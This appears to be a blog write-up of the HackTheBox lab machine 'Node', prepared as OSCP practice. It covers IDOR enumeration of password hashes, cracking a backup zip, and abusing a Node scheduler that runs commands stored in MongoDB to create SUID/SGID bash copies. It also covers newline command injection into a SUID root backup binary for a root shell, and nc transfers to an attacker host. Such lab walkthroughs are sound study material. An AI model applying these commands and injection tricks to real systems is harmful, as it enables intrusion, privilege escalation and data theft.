---
layout: post
title: "node"
date: 2025-09-03 
categories: OSCP Playlist
---
# node

## Summary:

- IDOR vulnerability reveal web pw
- john to bruteforce crack pw protected zip
- found new process and source code linking to a mongo db
- read source code, file from mongodb periodically executed
- raised to privileged user by creating a SUID + SGID /bin/bash
- found binary executed as root; command injection into root
- *did not include buffer overflow method

First, enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.10.58 -oN nmap/node

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/node/image.png)

There is also a login page. We attempt default login

```bash
admin:admin
' OR '1' = '1'-- -
```

Did not work. 

Let’s fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.58:3000/FUZZ -fs 3861

uploads                 [Status: 301, Size: 173, Words: 7, Lines: 10, Duration: 26ms]
assets                  [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 48ms]
vendor                  [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 57ms]
```

Clicking on the users, we see it makes a GET request. Viewing the response in burp, we get:

```bash
Request:
GET /api/users/rastating HTTP/1.1
Host: 10.10.10.58:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.10.58:3000/profiles/rastating
Priority: u=0

Response:
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 152
ETag: W/"98-wMKqi3vrbIjtG+phvDPJjgBHE+U"
Date: Wed, 03 Sep 2025 10:44:13 GMT
Connection: keep-alive

{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
```

This is a IDOR vulnerability and we could attempt to search for admin. Let’s see what happens when we just request the /api/users dir using Burp repeater:

```bash
Requets:
GET /api/users HTTP/1.1
Host: 10.10.10.58:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.10.58:3000/profiles/rastating
Priority: u=0

Response:
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 611
ETag: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"
Date: Wed, 03 Sep 2025 10:50:23 GMT
Connection: keep-alive

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
```

We have our admin account. Let’s send all the hashes to crackstation and see what cracks:

![image.png]({{ site.baseurl }}/assets/node/image%201.png)

```bash
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
```

Let’s login with admin:

![image.png]({{ site.baseurl }}/assets/node/image%202.png)

Looks like we can download backup.

```bash
file myplace.backup 

myplace.backup: ASCII text, with very long lines (65536), with no line terminators

less myplace.backup 
```

The content of the file seems to be base64 encoded strings. Let’s base64 decode it:

```bash
base64 -d myplace.backup > new.backup

file new.backup

new.backup: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Aug 16 2022 17:08:52, uncompressed size 0, method=store

```

It’s a zip archive. Let’s unzip it

```bash
unzip new.backup

Archive:  new.backup
   creating: var/www/myplace/
[new.backup] var/www/myplace/package-lock.json password: 

```

It needs a password, and it’s not the same password as the admin user, nor is it any other users’.

Let’s attempt to bruteforce crack the zip file:

```bash
zip2john new.backup > zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

magicword        (new.backup)  
```

Now we have found the password, let’s unzip.

Looking into /var/www/myplace/app.js:

```bash
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

<SNIP>
 app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.use(function(req, res, next){
    res.sendFile('app.html', { root: __dirname });
  });

  app.listen(3000, function () {
    console.log('MyPlace app listening on port 3000!')
  });

});
```

Seems like mongodb connection for user mark.

We get credential:

```bash
mark:5AYRft73VtFpc84k
```

Let’s try and ssh using that:

```bash
ssh mark@10.10.10.58
```

We are in. Let’s try and connect to mongo db now. We do not have permission to list other dbs.

```bash
mongo -u mark -p 5AYRft73VtFpc84k --authenticationDatabase myplace myplace

show collections

#result:
users
```

```bash
db.users.find() 

{ "_id" : ObjectId("59a7365b98aa325cc03ee51c"), "username" : "myP14ceAdm1nAcc0uNT", "password" : "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af", "is_admin" : true }
{ "_id" : ObjectId("59a7368398aa325cc03ee51d"), "username" : "tom", "password" : "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240", "is_admin" : false }
{ "_id" : ObjectId("59a7368e98aa325cc03ee51e"), "username" : "mark", "password" : "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73", "is_admin" : false }
{ "_id" : ObjectId("59aa9781cced6f1d1490fce9"), "username" : "rastating", "password" : "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0", "is_admin" : false }
```

No sudo privileges, also not in privileged groups. No hidden files. 

```bash
ls /home

frank  mark  tom
```

Let’s attmempt to switch users:

```bash
tom:spongebob
```

Did not work. 

Let’s check running processes:

```bash
ps -ef --forest

#interesting finds
tom       1251     1  0 11:37 ?        00:00:01 /usr/bin/node /var/scheduler/app.js
tom       1252     1  1 11:37 ?        00:02:12 /usr/bin/node /var/www/myplace/app.js
```

We already saw app.js from myplace. Let’s see /var/scheduler/app.js:

```bash
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});

```

Let’s login to this other db:

```bash
mongo -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler scheduler

> show collections
tasks

db.tasks.find() 
db.tasks.findOne()
```

Nothing.

Re-reading the script, it seems to execute a shell command from document from tasks then deletes it. 

Let’s create our malicious script:

```bash
db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:tom /tmp/tom; chmod 4755 /tmp/tom"});
```

After a while, checking in /tmp:

![image.png]({{ site.baseurl }}/assets/node/image%203.png)

Now let’s execute in privileged mode:

```bash
/tmp/tom -p
```

![image.png]({{ site.baseurl }}/assets/node/image%204.png)

However, at this point, we still cannot read user.txt in tom’s home dir:

```bash
tom-4.3$ ls -l
total 4
-rw-r----- 1 root tom 33 Sep  3 11:38 user.txt
tom-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) groups=1001(mark)
```

Only group tom can read. Let’s look into /etc/group and see what group memberships there are:

```bash
cat /etc/group

lpadmin:x:115:tom
sambashare:x:116:tom
mongodb:x:117:mongodb
mark:x:1001:
admin:x:1002:tom,root
<SNIP>
```

It looks like tom is in a lot of groups. Let’s use this command to see all the groups tom is part of:

```bash
groups tom

tom : tom adm cdrom sudo dip plugdev lpadmin sambashare admin
```

Technically we can become any member of that group, but for now, we just want to be in group tom, so we can read user.txt

```bash
mongo -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler scheduler
db.tasks.insert({"cmd":"/bin/chown tom:tom /tmp/tom; chmod 6755 /tmp/tom"});
```

Now when we execute bash again:

![image.png]({{ site.baseurl }}/assets/node/image%205.png)

Looking back in the /var/www/myplace/app.js, we see a peculiar binary:

```bash
 const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
 
  
  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.use(function(req, res, next){
    res.sendFile('app.html', { root: __dirname });
  });

  app.listen(3000, function () {
    console.log('MyPlace app listening on port 3000!')
  });

});

```

And this is executed by user tom. 

```bash
tom-4.3$ ls -l /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Group admin can execute it. Let’s upgrade our group membership:

```bash
db.tasks.insert({"cmd":"/bin/chown tom:admin /tmp/tom; chmod 6755 /tmp/tom"});
```

Now we are part of group admin, attempting to execute the binary yielded no result. No help menu either. Let’s reverse engineer the binary. First we have to transfer it back to our host:

```bash
#on target
cd /usr/local/bin
python3 -m http.sever 8000

#on attack host
wget http://10.10.10.58:8000/backup
```

Does not work. Maybe firewall blocking. Let’s use nc method:

```bash
nc -lnvp 1234 > backup

#target linux
nc 10.10.16.7 1234 < backup

#verify file integrity on both devices
md5sum backup
f2cd106436c96a80133fcddd06206042
```

Now let’s use r2 to debug:

```bash
chmod +x backup

r2 backup

#analyse
aaa
#print out function
db main #break point at main
s main  #seek main address
v   #visualisation mode

```

![image.png]({{ site.baseurl }}/assets/node/image%206.png)

As we can see there is a cmp function, just before the jump. Maybe the binary needs 3 arguments to prevent it from jumping to the exit function. Let’s try:

```bash
./backup 1 2 3
```

![image.png]({{ site.baseurl }}/assets/node/image%207.png)

We were right. Let’s also use strace to see what file the binary is trying to open:

```bash
strace ./backup 1 2 3

write(1, "\n", 1
)                       = 1
openat(AT_FDCWD, "/etc/myplace/keys", O_RDONLY) = -1 ENOENT (No such file or directory)
write(1, " \33[33m[!]\33[37m Could not open fi"..., 37 [!] Could not open file

```

Let’s go back to the target and check what /etc/myplace/keys is:

```bash
mark:5AYRft73VtFpc84k

ls -l /etc/myplace/keys
-rw-r--r-- 1 root root 196 Sep  2  2017 /etc/myplace/keys

cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

One of the key is the backup_key defined in app.js. So the whole command executed in app.js is something like:

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc/passwd  #we can just try a dir name

 [+] Finished! Encoded backup is below:
                                                                                                                                                                                                
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

Let’s try base64 decode it:

```bash
echo 'UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==' | base64 -d > t.bak

file t.bak                                                                                                                                                                        
t.bak: Zip archive data

unzip t.bak

Archive:  t.bak
   skipping: root.txt                need PK compat. v5.1 (can do v4.6)

```

Let’s transfer it back to our host:

```bash
#on attack host
nc -lnvp 1234 > t.bak

#on target 
nc 10.10.16.7 1234 < t.bak
```

Still the same problem. Let’s try 7z:

```bash
7z e t.bak #magicword

cat root.txt
```

![image.png]({{ site.baseurl }}/assets/node/image%208.png)

Not the flag.

Debugging the binary through r2 reveals blacklisted chars.

Blacklisted characters are:

```bash
.. /root ; & ` $ | etc // / /etc
```

method 1:

since root is not blacklisted, we can just archive the whole dir:

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
```

method 2:

But if we type this shorthand:

```bash
r??t
```

This will translate as root:

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/r??t.txt

UEsDBAoACQAAANJcI1tKo6IRLQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADrBq4aKwauGh1eAsAAQQAAAAABAAAAABeXnrLbdYHnf3h3SrRP/BZg0/3dtrcTsR/f46AB+/SbxNewr22cIDzXeYC6AhQSwcISqOiES0AAAAhAAAAUEsBAh4DCgAJAAAA0lwjW0qjohEtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA6wauGh1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
```

method 3:

The binary is calling system to execute the command. We can inject a command from a new line.

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "JUNK
/bin/bash
JUNK"
```

Then we get root access

![image.png]({{ site.baseurl }}/assets/node/image%209.png)

Another way to do the same method is:

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'JUNK\n/bin/bash\nJUNK')"
```